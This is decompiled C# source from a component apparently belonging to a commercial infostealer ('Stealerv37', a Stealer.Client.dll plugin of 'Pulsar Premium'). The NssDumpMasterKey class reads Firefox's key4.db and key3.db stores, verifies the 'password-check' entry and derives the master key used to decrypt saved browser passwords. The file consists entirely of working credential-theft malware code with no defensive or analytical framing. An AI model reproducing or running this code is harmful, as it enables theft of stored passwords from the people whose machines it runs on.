// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.NssDumpMasterKey
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Hashing;
using Intelix.Helper.Sql;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;

#nullable disable
namespace Intelix.Helper.Encrypted;

public static class NssDumpMasterKey
{
  public static byte[] Key4Database(string path)
  {
    Asn1Der asn1Der = new Asn1Der();
    SqLite sqLite = SqLite.ReadTable(path, "metaData");
    if (sqLite == null)
      return (byte[]) null;
    for (int rowNum1 = 0; rowNum1 < sqLite.GetRowCount(); ++rowNum1)
    {
      if (!(sqLite.GetValue(rowNum1, 0) != "password"))
      {
        byte[] bytes1 = Encoding.UTF8.GetBytes(sqLite.GetValue(rowNum1, 1));
        byte[] bytes2 = Encoding.UTF8.GetBytes(sqLite.GetValue(rowNum1, 2));
        if (bytes1.Length >= 1 && bytes2.Length >= 1)
        {
          Asn1DerObject asn1DerObject1 = asn1Der.Parse(bytes2);
          string str = asn1DerObject1.ToString();
          if (str != null)
          {
            if (str.Contains("2A864886F70D010C050103"))
            {
              byte[] data1 = asn1DerObject1.Objects[0]?.Objects[0]?.Objects[1]?.Objects[0]?.Data;
              byte[] data2 = asn1DerObject1.Objects[0]?.Objects[1]?.Data;
              if (data1 != null && data2 != null)
              {
                byte[] bytes3 = new TripleDes(data2, bytes1, new byte[0], data1).Compute();
                if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes3).StartsWith("password-check"))
                  continue;
              }
              else
                continue;
            }
            else if (str.Contains("2A864886F70D01050D"))
            {
              byte[] data3 = asn1DerObject1.Objects[0]?.Objects[0]?.Objects[1]?.Objects[0]?.Objects[1]?.Objects[0]?.Data;
              byte[] data4 = asn1DerObject1.Objects[0]?.Objects[0]?.Objects[1]?.Objects[2]?.Objects[1]?.Data;
              byte[] data5 = asn1DerObject1.Objects[0]?.Objects[0]?.Objects[1]?.Objects[3]?.Data;
              if (data3 != null && data4 != null && data5 != null)
              {
                byte[] bytes4 = new PBE(data5, bytes1, new byte[0], data3, data4).Compute();
                if (!Encoding.GetEncoding("ISO-8859-1").GetString(bytes4).StartsWith("password-check"))
                  continue;
              }
              else
                continue;
            }
            else
              continue;
            sqLite = SqLite.ReadTable(path, "nssPrivate");
            if (sqLite != null)
            {
              int rowNum2 = 0;
              if (rowNum2 < sqLite.GetRowCount())
              {
                byte[] bytes5 = Encoding.UTF8.GetBytes(sqLite.GetValue(rowNum2, 6));
                Asn1DerObject asn1DerObject2 = asn1Der.Parse(bytes5);
                byte[] data6 = asn1DerObject2.Objects[0].Objects[0].Objects[1].Objects[0].Objects[1].Objects[0].Data;
                byte[] data7 = asn1DerObject2.Objects[0].Objects[0].Objects[1].Objects[2].Objects[1].Data;
                byte[] sourceArray = new PBE(asn1DerObject2.Objects[0].Objects[0].Objects[1].Objects[3].Data, bytes1, new byte[0], data6, data7).Compute();
                byte[] numArray = new byte[24];
                byte[] destinationArray = numArray;
                int length = numArray.Length;
                Array.Copy((Array) sourceArray, (Array) destinationArray, length);
                return numArray;
              }
            }
          }
        }
      }
    }
    return (byte[]) null;
  }

  public static byte[] Key3Database(string path)
  {
    byte[] file = File.ReadAllBytes(path);
    if (file == null)
      return (byte[]) null;
    Asn1Der asn1Der = new Asn1Der();
    BerkeleyDB berkeleyDb = new BerkeleyDB(file);
    string str1 = berkeleyDb.Keys.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>) (p => p.Key.Equals("password-check"))).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>) (p => p.Value)).FirstOrDefault<string>();
    if (str1 == null)
      return (byte[]) null;
    string str2 = str1.Replace("-", (string) null);
    int length = int.Parse(str2.Substring(2, 2), NumberStyles.HexNumber) * 2;
    string hexString1 = str2.Substring(6, length);
    int num = str2.Length - (6 + length + 36);
    string hexString2 = str2.Substring(6 + length + 4 + num);
    string str3 = berkeleyDb.Keys.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>) (p => p.Key.Equals("global-salt"))).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>) (p => p.Value)).FirstOrDefault<string>();
    if (str3 == null)
      return (byte[]) null;
    string hexString3 = str3.Replace("-", (string) null);
    TripleDes tripleDes1 = new TripleDes(NssDumpMasterKey.HexToBytes(hexString3), Encoding.ASCII.GetBytes(""), NssDumpMasterKey.HexToBytes(hexString1));
    tripleDes1.ComputeVoid();
    if (!TripleDes.DecryptStringDesCbc(tripleDes1.Key, tripleDes1.Vector, NssDumpMasterKey.HexToBytes(hexString2)).StartsWith("password-check"))
      return (byte[]) null;
    string str4 = berkeleyDb.Keys.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>) (p => !p.Key.Equals("global-salt") && !p.Key.Equals("Version") && !p.Key.Equals("password-check"))).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>) (p => p.Value)).FirstOrDefault<string>();
    if (str4 == null)
      return (byte[]) null;
    string hexString4 = str4.Replace("-", "");
    Asn1DerObject asn1DerObject1 = asn1Der.Parse(NssDumpMasterKey.HexToBytes(hexString4));
    TripleDes tripleDes2 = new TripleDes(NssDumpMasterKey.HexToBytes(hexString3), Encoding.ASCII.GetBytes(""), asn1DerObject1.Objects[0].Objects[0].Objects[1].Objects[0].Data);
    tripleDes2.ComputeVoid();
    byte[] toParse = TripleDes.DecryptByteDesCbc(tripleDes2.Key, tripleDes2.Vector, asn1DerObject1.Objects[0].Objects[1].Data);
    Asn1DerObject asn1DerObject2 = asn1Der.Parse(toParse);
    Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.Objects[0].Objects[2].Data);
    byte[] destinationArray = new byte[24];
    if (asn1DerObject3.Objects[0].Objects[3].Data.Length > 24)
      Array.Copy((Array) asn1DerObject3.Objects[0].Objects[3].Data, asn1DerObject3.Objects[0].Objects[3].Data.Length - 24, (Array) destinationArray, 0, 24);
    else
      destinationArray = asn1DerObject3.Objects[0].Objects[3].Data;
    return destinationArray;
  }

  public static byte[] HexToBytes(string hexString)
  {
    if (hexString.Length % 2 != 0)
      return (byte[]) null;
    byte[] bytes = new byte[hexString.Length / 2];
    for (int index = 0; index < bytes.Length; ++index)
    {
      string s = hexString.Substring(index * 2, 2);
      bytes[index] = byte.Parse(s, NumberStyles.HexNumber, (IFormatProvider) CultureInfo.InvariantCulture);
    }
    return bytes;
  }
}
